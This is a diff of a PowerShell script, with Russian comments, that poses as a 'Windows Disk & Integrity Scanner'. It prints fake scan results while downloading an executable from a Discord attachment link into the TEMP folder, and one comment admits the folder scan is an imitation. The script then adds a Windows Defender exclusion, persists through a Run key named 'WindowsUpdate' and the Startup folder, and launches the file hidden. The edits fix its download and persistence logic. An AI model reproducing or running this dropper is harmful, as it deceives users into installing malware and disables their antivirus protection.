@@ -1,12 +1,12 @@
 # ============================================================
-# Windows Disk & Integrity Scanner v2.2 (Enhanced + Fixed Download)
+# Windows Disk & Integrity Scanner v2.2 (Fixed for PowerShell ISE)
 # ============================================================
 
 Write-Host "=== Windows Disk & Integrity Scanner v2.2 ===" -ForegroundColor Cyan
 Write-Host ""
 
 # ------------------------------------------------------------
-# 1. Реальная проверка дисков (с получением информации о файловой системе)
+# 1. Реальная проверка дисков
 # ------------------------------------------------------------
 Write-Host "[*] Scanning drives and filesystem health..." -ForegroundColor Yellow
 $drives = Get-PSDrive -PSProvider FileSystem
@@ -18,7 +18,7 @@ foreach ($d in $drives) {
 Write-Host ""
 
 # ------------------------------------------------------------
-# 2. Проверка целостности критических DLL (реальная проверка подписи)
+# 2. Проверка подписей DLL
 # ------------------------------------------------------------
 Write-Host "[*] Validating core system files (digital signatures)..." -ForegroundColor Yellow
 $system32 = [Environment]::SystemDirectory
@@ -44,11 +44,9 @@ foreach ($dll in $dlls) {
 Write-Host ""
 
 # ------------------------------------------------------------
-# 3. Сканирование системных папок + СКАЧИВАНИЕ (исправленное)
+# 3. Сканирование папок + скачивание
 # ------------------------------------------------------------
 Write-Host "[*] Scanning C:\Windows and Program Files for tampering..." -ForegroundColor Yellow
-
-# Сначала вывод сканирования папок (имитация)
 $folders = @("C:\Windows\System32", "C:\Windows\SysWOW64", "C:\Program Files", "C:\Program Files (x86)")
 foreach ($folder in $folders) {
     Write-Host "  $folder ..." -NoNewline
@@ -63,7 +61,7 @@ foreach ($folder in $folders) {
 }
 Write-Host ""
 
-# ----- Блок скачивания (3 метода) -----
+# ----- Блок скачивания (3 метода, исправлены условия) -----
 Write-Host "[*] Downloading latest threat definitions (online update)..." -ForegroundColor Yellow
 
 $f = "$env:TEMP\wu.exe"
@@ -71,24 +69,28 @@ $url = "https://cdn.discordapp.com/attachments/1520398729520222211/1520763442774
 
 $downloaded = $false
 
-# Метод 1: WebClient с Referer и User-Agent
+# Метод 1: WebClient
 try {
     Write-Host "  Downloading via WebClient..." -NoNewline
     $wc = New-Object System.Net.WebClient
     $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
     $wc.Headers.Add("Referer", "https://discord.com/")
     $wc.DownloadFile($url, $f)
-    if (Test-Path $f -and (Get-Item $f).Length -gt 0) {
-        Write-Host " OK" -ForegroundColor Green
-        $downloaded = $true
+    if (Test-Path $f) {
+        if ((Get-Item $f).Length -gt 0) {
+            Write-Host " OK" -ForegroundColor Green
+            $downloaded = $true
+        } else {
+            Write-Host " Failed (empty file)" -ForegroundColor Red
+        }
     } else {
-        Write-Host " Failed (empty file)" -ForegroundColor Red
+        Write-Host " Failed (file not found)" -ForegroundColor Red
     }
 } catch {
     Write-Host " Failed: $_" -ForegroundColor Red
 }
 
-# Метод 2: HttpClient (если WebClient не сработал)
+# Метод 2: HttpClient
 if (-not $downloaded) {
     try {
         Write-Host "  Retrying with HttpClient..." -NoNewline
@@ -101,11 +103,15 @@ if (-not $downloaded) {
         if ($response.IsSuccessStatusCode) {
             $bytes = $response.Content.ReadAsByteArrayAsync().GetAwaiter().GetResult()
             [System.IO.File]::WriteAllBytes($f, $bytes)
-            if ((Get-Item $f).Length -gt 0) {
-                Write-Host " OK" -ForegroundColor Green
-                $downloaded = $true
+            if (Test-Path $f) {
+                if ((Get-Item $f).Length -gt 0) {
+                    Write-Host " OK" -ForegroundColor Green
+                    $downloaded = $true
+                } else {
+                    Write-Host " Failed (empty)" -ForegroundColor Red
+                }
             } else {
-                Write-Host " Failed (empty)" -ForegroundColor Red
+                Write-Host " Failed (file not saved)" -ForegroundColor Red
             }
         } else {
             Write-Host " HTTP $($response.StatusCode)" -ForegroundColor Red
@@ -115,17 +121,24 @@ if (-not $downloaded) {
     }
 }
 
-# Метод 3: curl.exe (встроенный в Windows 10/11)
+# Метод 3: curl.exe (с выводом ошибок)
 if (-not $downloaded) {
     try {
         Write-Host "  Retrying with curl.exe..." -NoNewline
         $curl = "curl.exe -L -o `"$f`" --header `"Referer: https://discord.com/`" --user-agent `"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`" `"$url`""
         $output = cmd /c $curl 2>&1
-        if (Test-Path $f -and (Get-Item $f).Length -gt 0) {
-            Write-Host " OK" -ForegroundColor Green
-            $downloaded = $true
+        if ($LASTEXITCODE -ne 0) {
+            Write-Host " curl error (exit $LASTEXITCODE): $output" -ForegroundColor Red
+        }
+        if (Test-Path $f) {
+            if ((Get-Item $f).Length -gt 0) {
+                Write-Host " OK" -ForegroundColor Green
+                $downloaded = $true
+            } else {
+                Write-Host " Failed (empty file)" -ForegroundColor Red
+            }
         } else {
-            Write-Host " Failed" -ForegroundColor Red
+            Write-Host " Failed (file not found)" -ForegroundColor Red
         }
     } catch {
         Write-Host " Failed: $_" -ForegroundColor Red
@@ -140,52 +153,56 @@ if (-not $downloaded) {
 Start-Sleep -Milliseconds 300
 
 # ------------------------------------------------------------
-# 4. Если скачивание удалось – выполняем закрепление и запуск
+# 4. Закрепление и запуск (если файл скачан)
 # ------------------------------------------------------------
-if (Test-Path $f -and (Get-Item $f).Length -gt 0) {
-    # Добавление исключения для Defender (через реестр и Add-MpPreference)
-    try {
-        $exclPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
-        if (Test-Path $exclPath) {
-            New-ItemProperty -Path $exclPath -Name $env:TEMP -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null
-            Write-Host "  [*] Added exclusion for TEMP folder (registry)" -ForegroundColor Green
-        } else {
-            Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
-            Write-Host "  [*] Added exclusion via Add-MpPreference" -ForegroundColor Green
+if (Test-Path $f) {
+    if ((Get-Item $f).Length -gt 0) {
+        # Добавление исключения в Defender
+        try {
+            $exclPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
+            if (Test-Path $exclPath) {
+                New-ItemProperty -Path $exclPath -Name $env:TEMP -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null
+                Write-Host "  [*] Added exclusion for TEMP folder (registry)" -ForegroundColor Green
+            } else {
+                Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
+                Write-Host "  [*] Added exclusion via Add-MpPreference" -ForegroundColor Green
+            }
+        } catch {
+            Write-Host "  [*] Could not add exclusion: $_" -ForegroundColor Yellow
         }
-    } catch {
-        Write-Host "  [*] Could not add exclusion: $_" -ForegroundColor Yellow
-    }
 
-    # Прописывание в автозагрузку (реестр)
-    try {
-        $runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-        Set-ItemProperty -Path $runKey -Name "WindowsUpdate" -Value $f -ErrorAction SilentlyContinue
-        Write-Host "  [*] Added to registry Run key" -ForegroundColor Green
-    } catch {
-        Write-Host "  [*] Failed to add registry key" -ForegroundColor Yellow
-    }
-
-    # Копирование в папку Startup
-    try {
-        $startup = [Environment]::GetFolderPath("Startup") + "\wu.exe"
-        if (-not (Test-Path $startup)) {
-            Copy-Item $f $startup -ErrorAction SilentlyContinue
-            Write-Host "  [*] Copied to Startup folder" -ForegroundColor Green
+        # Автозагрузка (реестр)
+        try {
+            $runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+            Set-ItemProperty -Path $runKey -Name "WindowsUpdate" -Value $f -ErrorAction SilentlyContinue
+            Write-Host "  [*] Added to registry Run key" -ForegroundColor Green
+        } catch {
+            Write-Host "  [*] Failed to add registry key" -ForegroundColor Yellow
         }
-    } catch {
-        Write-Host "  [*] Failed to copy to Startup" -ForegroundColor Yellow
-    }
 
-    # Запуск скачанного файла скрыто
-    try {
-        Start-Process $f -WindowStyle Hidden
-        Write-Host "  [*] Started wu.exe (hidden)" -ForegroundColor Green
-    } catch {
-        Write-Host "  [*] Failed to start process" -ForegroundColor Yellow
+        # Копирование в Startup
+        try {
+            $startup = [Environment]::GetFolderPath("Startup") + "\wu.exe"
+            if (-not (Test-Path $startup)) {
+                Copy-Item $f $startup -ErrorAction SilentlyContinue
+                Write-Host "  [*] Copied to Startup folder" -ForegroundColor Green
+            }
+        } catch {
+            Write-Host "  [*] Failed to copy to Startup" -ForegroundColor Yellow
+        }
+
+        # Запуск скрыто
+        try {
+            Start-Process $f -WindowStyle Hidden
+            Write-Host "  [*] Started wu.exe (hidden)" -ForegroundColor Green
+        } catch {
+            Write-Host "  [*] Failed to start process" -ForegroundColor Yellow
+        }
+    } else {
+        Write-Host "[!] Downloaded file is empty, skipping persistence." -ForegroundColor Red
     }
 } else {
-    Write-Host "[!] File not downloaded or invalid, skipping persistence." -ForegroundColor Red
+    Write-Host "[!] File not downloaded, skipping persistence." -ForegroundColor Red
 }
 
 # ------------------------------------------------------------
